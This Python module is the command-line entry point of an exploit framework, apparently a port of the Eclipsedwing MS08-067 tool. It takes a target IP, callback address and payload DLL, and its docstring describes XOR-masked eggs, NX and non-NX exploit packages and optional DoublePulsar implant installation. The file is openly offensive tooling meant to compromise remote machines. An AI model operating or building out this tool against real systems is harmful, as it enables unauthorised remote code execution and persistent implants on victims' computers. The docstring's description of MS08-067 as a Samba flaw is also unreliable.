"""eclipsedwing — MS08-067 (Samba NetPathCanonicalize) exploit framework.

Python port of Eclipsedwing-1.5.2.exe. Reverse-engineered from IDA analysis:
static libs adfw-2/tibe-1/trfo-2/trch-0/tucl-1, parameters extracted from
InitializeParameters (sub_401D10). Supports three operational modes:
Callback (default, target calls back), Listener (client-initiated), RPCReuse
(forwards through a reusable RPC pipe). Builds a primer package, prepares an
XOR-masked egg with AuthCode, builds an NX / non-NX exploit package for
MS08-067, and optionally installs a DoublePulsar payload via FbStorage.
"""

from . import eclipsedwing


def eclipsedwing_handle(args):
    """Run MS08-067 exploit against the supplied target."""
    return eclipsedwing.run(
        target_ip=args.target_ip,
        target_port=args.target_port,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
        callback_local_port=args.callback_local_port,
        callin_port=args.callin_port,
        listen_port=args.listen_port,
        payload_dll=args.payload_dll,
        fb_storage=args.fb_storage,
        protocol=args.protocol,
        network_timeout=args.network_timeout,
        callin_timeout=args.callin_timeout,
        target_mode=args.target_mode,
        rpc_proxy=args.rpc_proxy,
        xor_mask=args.xor_mask,
        no_nx=args.no_nx,
    )


def reg_subparser(subparsers):
    p = subparsers.add_parser(
        "eclipsedwing",
        help="MS08-067 (Eclipsedwing) 利用框架",
        description=__doc__,
    )
    p.add_argument("target_ip", help="目标 IP")
    p.add_argument("-P", "--target-port", type=int, default=445, help="目标 SMB 端口 (默认 445)")
    p.add_argument("--callback-ip", required=True, help="回调 IP")
    p.add_argument("--callback-port", type=int, required=True, help="回调端口")
    p.add_argument("--callback-local-port", type=int, default=0, help="本地回调端口")
    p.add_argument("--callin-port", type=int, default=0, help="回拨端口")
    p.add_argument("--listen-port", type=int, default=0, help="监听端口")
    p.add_argument("--payload-dll", help="Payload DLL 路径")
    p.add_argument("--fb-storage", help="FbStorage 路径/文件名")
    p.add_argument("--protocol", choices=["SMB", "NBT"], default="SMB", help="协议")
    p.add_argument("--network-timeout", type=float, default=30.0, help="网络超时")
    p.add_argument("--callin-timeout", type=float, default=60.0, help="回调超时")
    p.add_argument("--target-mode", choices=["Callback", "Listener", "RPCReuse"], default="Callback", help="目标模式")
    p.add_argument("--rpc-proxy", help="RPC 代理路径/参数 (用于 RPCReuse)")
    p.add_argument("--xor-mask", type=int, default=0, help="EGG XOR mask")
    p.add_argument("--no-nx", action="store_true", help="目标非 NX 支持")
    p.set_defaults(func=eclipsedwing_handle)
